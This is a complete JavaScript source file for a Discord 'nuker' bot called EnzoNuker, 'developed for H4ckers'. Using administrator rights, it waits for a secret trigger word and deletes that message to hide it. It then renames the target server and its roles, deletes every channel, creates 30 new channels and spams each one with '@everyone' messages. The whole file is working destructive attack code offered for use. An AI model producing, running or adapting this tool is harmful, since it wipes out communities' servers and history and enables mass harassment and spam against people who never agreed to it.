const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

let config = {
    serverName: "Enzo",
    channelName: "enzo",
    channelCount: 30,
    roleName: "Enzo",
    iconPath: "./icon.png",
    spamMessage: "@everyone Enzo is here!",
    spamCount: 5,
    triggerWord: "enzostart"
};

if (fs.existsSync('./config.json')) {
    try {
        const fileConfig = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
        config = { ...config, ...fileConfig };
    } catch (err) {
        console.error('\x1b[31m[Error] Failed to read config.json, using defaults.\x1b[0m');
    }
}

const COLORS = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    dim: "\x1b[2m",
    info: "\x1b[36m",
    success: "\x1b[32m",
    warn: "\x1b[33m",
    error: "\x1b[31m",
    magenta: "\x1b[35m",
    white: "\x1b[37m"
};

const logFilePath = path.join(__dirname, 'session_log.txt');
fs.writeFileSync(logFilePath, `=== EnzoNuker Session Started at ${new Date().toLocaleString()} ===\n\n`);

function stripAnsi(text) {
    return text.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');
}

function log(type, message) {
    const time = new Date().toLocaleTimeString();
    let consolePrefix = `[${time}] `;
    let filePrefix = `[${time}] [${type.toUpperCase()}] `;
    
    switch (type) {
        case 'info': consolePrefix += `${COLORS.info}[INFO]${COLORS.reset} `; break;
        case 'success': consolePrefix += `${COLORS.success}[SUCCESS]${COLORS.reset} `; break;
        case 'warn': consolePrefix += `${COLORS.warn}[WARN]${COLORS.reset} `; break;
        case 'error': consolePrefix += `${COLORS.error}[ERROR]${COLORS.reset} `; break;
        case 'nuke': consolePrefix += `${COLORS.magenta}[SYSTEM]${COLORS.reset} `; break;
    }
    
    console.log(`${consolePrefix}${message}`);
    
    try {
        fs.appendFileSync(logFilePath, stripAnsi(`${filePrefix}${message}\n`));
    } catch (err) {
    }
}

const banner = `
${COLORS.magenta}${COLORS.bright}
███████╗███╗   ██╗███████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔════╝████╗  ██║╚══███╔╝██╔═══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
█████╗  ██╔██╗ ██║  ███╔╝ ██║   ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══╝  ██║╚██╗██║ ███╔╝  ██║   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
███████╗██║ ╚████║███████╗╚██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
${COLORS.reset}${COLORS.dim}Developed for H4ckers by Enzo${COLORS.reset}
`;

console.log(banner);
fs.appendFileSync(logFilePath, stripAnsi(banner) + '\n');

const token = process.env.DISCORD_TOKEN;
const guildId = process.env.GUILD_ID;

if (!token || token === 'YOUR_DISCORD_BOT_TOKEN_HERE') {
    log('error', 'Discord Bot Token is not configured in the .env file!');
    process.exit(1);
}

if (!guildId || guildId === 'YOUR_TARGET_SERVER_ID_HERE') {
    log('error', 'Target Guild ID (GUILD_ID) is not configured in the .env file!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('clientReady', async () => {
    log('success', `Logged in as ${COLORS.bright}${client.user.tag}${COLORS.reset}`);
    log('info', `Connecting to target server...`);

    let guild;
    try {
        guild = await client.guilds.fetch(guildId);
    } catch (err) {
        log('error', `Failed to fetch target server. Verify that the Bot is in the server and GUILD_ID is correct.`);
        process.exit(1);
    }

    const botMember = await guild.members.fetch(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
        log('error', `The Bot does NOT have 'ADMINISTRATOR' permissions. Drag bot's role to the top and grant admin permissions.`);
        process.exit(1);
    }

    const channels = await guild.channels.fetch();
    const roles = await guild.roles.fetch();

    const card = `
${COLORS.white}╔══════════════════════════════════════════════════════════╗
║               ${COLORS.magenta}${COLORS.bright}Target Server Analytics Card${COLORS.reset}${COLORS.white}               ║
╠══════════════════════════════════════════════════════════╣
║  ${COLORS.info}Server Name${COLORS.reset} : ${guild.name.padEnd(41)} ${COLORS.white}║
║  ${COLORS.info}Guild ID   ${COLORS.reset} : ${guild.id.padEnd(41)} ${COLORS.white}║
║  ${COLORS.info}Members    ${COLORS.reset} : ${(guild.memberCount + " members").padEnd(41)} ${COLORS.white}║
║  ${COLORS.info}Channels   ${COLORS.reset} : ${(channels.size + " channels").padEnd(41)} ${COLORS.white}║
║  ${COLORS.info}Roles      ${COLORS.reset} : ${(roles.size + " roles").padEnd(41)} ${COLORS.white}║
║  ${COLORS.info}Bot Role   ${COLORS.reset} : ${botMember.roles.highest.name.padEnd(41)} ${COLORS.white}║
╚══════════════════════════════════════════════════════════╝${COLORS.reset}
`;
    console.log(card);
    fs.appendFileSync(logFilePath, stripAnsi(card) + '\n');
    
    log('success', `${COLORS.bright}AUTOMATED SILENT LISTENING MODE ACTIVATED${COLORS.reset}`);
    log('info', `Waiting silently for trigger word: "${COLORS.bright}${COLORS.success}${config.triggerWord}${COLORS.reset}" in any chat channel...`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild || message.guild.id !== guildId) return;

    if (message.content.trim() === config.triggerWord) {
        try {
            await message.delete();
            log('info', `Stealth check: Deleted trigger message from chat history.`);
        } catch (err) {
        }

        log('nuke', `AUTHENTICATED DISCORD REMOTE TRIGGER DETECTED!`);
        log('nuke', `Triggered by: ${message.author.tag} in channel: #${message.channel.name}`);
        log('nuke', 'Starting absolute parallel server reset sequence automatically...');

        try {
            const botMember = await message.guild.members.fetch(client.user.id);
            
            Promise.allSettled([
                updateProfile(message.guild),
                renameRoles(message.guild, botMember),
                wipeChannels(message.guild),
                rebuildAndSpamChannels(message.guild)
            ]).then((results) => {
                log('success', 'Absolute parallel server reset sequence completed successfully!');
                log('info', `Waiting silently for next trigger...`);
            }).catch(err => {
                log('error', `An error occurred during parallel task synchronization: ${err.message}`);
            });

        } catch (error) {
            log('error', `An error occurred during automated trigger setup: ${error.message}`);
        }
    }
});

async function updateProfile(guild) {
    log('nuke', `Updating Server Profile details...`);
    try {
        const updateData = { name: config.serverName };
        
        if (config.iconPath) {
            const absoluteIconPath = path.resolve(config.iconPath);
            if (fs.existsSync(absoluteIconPath)) {
                log('info', `Loading dynamic premium logo buffer: ${config.iconPath}...`);
                const iconBuffer = fs.readFileSync(absoluteIconPath);
                updateData.icon = iconBuffer;
            } else {
                log('warn', `Custom logo icon not found at ${config.iconPath}, skipping icon upload.`);
            }
        }
        
        await guild.edit(updateData);
        log('success', `Server profile updated successfully! Name set to: "${config.serverName}"`);
    } catch (err) {
        log('error', `Failed to edit server profile: ${err.message}`);
    }
}

async function renameRoles(guild, botMember) {
    log('nuke', `Modifying guild roles in parallel...`);
    try {
        const roles = await guild.roles.fetch();
        const editableRoles = Array.from(roles.filter(role => 
            !role.managed &&
            role.id !== guild.id &&
            role.comparePositionTo(botMember.roles.highest) < 0
        ).values());

        if (editableRoles.length === 0) {
            log('warn', 'No editable roles found in this server.');
            return;
        }

        log('info', `Firing renaming actions for ${editableRoles.length} roles concurrently...`);
        
        const rolePromises = editableRoles.map(async (role) => {
            try {
                const oldName = role.name;
                log('info', `Renaming role: [${oldName}] ➔ [${config.roleName}]...`);
                await role.setName(config.roleName);
                log('success', `Successfully renamed: [${oldName}]`);
            } catch (err) {
                log('warn', `Failed to modify role [${role.name}]: ${err.message}`);
            }
        });

        await Promise.allSettled(rolePromises);
        log('success', `Role modifications finalized!`);
    } catch (err) {
        log('error', `Failed to fetch roles for editing: ${err.message}`);
    }
}

async function wipeChannels(guild) {
    log('nuke', `Purging all channels in parallel...`);
    try {
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());

        if (channelList.length === 0) {
            log('warn', 'No channels found to wipe.');
            return;
        }

        log('info', `Firing deletion for ${channelList.length} channels concurrently...`);

        const deletePromises = channelList.map(async (channel) => {
            try {
                const chanName = channel.name;
                const chanType = ChannelType[channel.type] || 'Unknown';
                log('info', `Wiping channel: #${chanName} (${chanType})...`);
                await channel.delete();
                log('success', `Successfully wiped: #${chanName}`);
            } catch (err) {
                log('warn', `Failed to delete channel #${channel.name}: ${err.message}`);
            }
        });

        await Promise.allSettled(deletePromises);
        log('success', `Channel wipe completed!`);
    } catch (err) {
        log('error', `Failed to fetch channels for deletion: ${err.message}`);
    }
}

async function rebuildAndSpamChannels(guild) {
    log('nuke', `Spawning custom Enzo channels and executing spam pipelines concurrently...`);
    try {
        const createPromises = [];
        
        for (let i = 1; i <= config.channelCount; i++) {
            const channelNameFormatted = `${config.channelName}-${i}`;
            
            createPromises.push((async () => {
                try {
                    log('info', `Spawning channel: #${channelNameFormatted}...`);
                    const newChannel = await guild.channels.create({
                        name: channelNameFormatted,
                        type: ChannelType.GuildText
                    });
                    log('success', `Successfully created: #${newChannel.name}`);

                    if (config.spamMessage && config.spamCount > 0) {
                        log('info', `Firing spam messages in #${newChannel.name}...`);
                        const spamPromises = [];
                        
                        for (let j = 0; j < config.spamCount; j++) {
                            spamPromises.push(
                                newChannel.send(config.spamMessage).catch(err => {
                                    log('warn', `Failed to send spam in #${newChannel.name}: ${err.message}`);
                                })
                            );
                        }
                        
                        await Promise.all(spamPromises);
                        log('success', `Spam complete! Fired ${config.spamCount} messages in #${newChannel.name}`);
                    }
                } catch (err) {
                    log('warn', `Failed to spawn channel #${channelNameFormatted}: ${err.message}`);
                }
            })());
        }

        await Promise.allSettled(createPromises);
        log('success', `All channels spawned and spam pipelines completed successfully!`);
    } catch (err) {
        log('error', `Failed to compile rebuilding and spamming requests: ${err.message}`);
    }
}

client.login(token).catch(err => {
    log('error', `Authentication failed: ${err.message}`);
    process.exit(1);
});
